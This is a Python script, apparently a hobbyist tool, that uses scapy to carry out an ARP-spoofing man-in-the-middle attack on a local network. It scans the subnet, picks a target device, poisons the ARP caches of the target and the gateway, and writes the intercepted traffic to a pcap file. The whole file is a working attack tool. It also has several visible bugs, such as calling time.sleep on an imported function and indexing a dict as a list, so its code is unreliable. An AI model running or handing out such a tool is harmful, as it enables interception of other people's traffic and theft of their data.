import subprocess
import threading
from time import time
import scapy.all as scapy
import os
from ipaddress import IPv4Network

cwd = os.getcwd()

def getInterfaceName(gatewayResult):
    os.chdir("/sys/class/net")
    interfaceNames = os.listdir()
    for iN in interfaceNames:
        if iN in gatewayResult:
            return iN

def arpSpoofer(targetIP, targetMAC, spoofIP):
    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofIP)
    scapy.send(packet, verbose=False)

def sendSpoofPackets():
    while True:
        arpSpoofer(gatewayInfo["ipaddress"], gatewayInfo["macaddress"], clientToHack["ipaddress"])
        arpSpoofer(clientToHack["ipaddress"], clientToHack["macaddress"], gatewayInfo["ipaddress"])
        time.sleep(3)

def processSniffedPacket(packet):
    print("Writing.....")
    scapy.wrpcap("packets.pcap", packet, append=True)

ipRange = "192.168.1.0/24"
#ip forwarding
#enable ip forwarding
subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
#load in sysctl settings from the /etc/sysctl.conf file
subprocess.run(["sysctl", "-p", "/etc/sysctl.conf"])

#arp scan
arpResponse = list()
arpResult = scapy.arping(ipRange, verbose=0)[0]

for response in arpResult:
    arpResponse.append({"ipaddress" : response[1].psrc, "macaddress" : response[1].hwsrc})

if len(arpResponse) == 0:
    print("No available devices.....")
    exit()

#gateway info
gatewayResults = subprocess.run(["route", "-n"], capture_output=True).stdout.decode().split("\n")

gateways = []

for aR in arpResponse:
    for gR in gatewayResults:
        if aR["ipaddress"] in gR:
            interfaceName = getInterfaceName(gR)
            gateways = {"interface" : interfaceName,"ipaddress" : aR["ipaddress"], "macaddress" : aR["macaddress"]}

#look at this
gatewayInfo = gateways[0]

clientInfo = []
for g in gateways:
    for aR in arpResponse:
        if g["ipaddress"] != aR["ipaddress"]:
            clientInfo.append(aR)

if len(clientInfo) == 0:
    print("No clients found.....")
    exit()

print(".....Man In the Middle Attack.....")
print("......Let the hacking begin.......")

for id, aR in enumerate(arpResponse):
    print("ID: "+ id +"IP Address: " + aR["ipaddress"] + " MAC Address: " + aR["macaddress"])

while True:
        try:
            inputChoice = int(input("Select the ID of the target: "))
            if arpResponse[inputChoice]:
                choice = inputChoice
                break
        except:
            print("Please enter a valid choice!")

clientToHack = clientInfo[choice]

thread = threading.Thread(target=sendSpoofPackets, daemon=True)
thread.start()

os.chdir(cwd)

scapy.sniff(iface = gatewayInfo["interface"], store = False, prn = processSniffedPacket)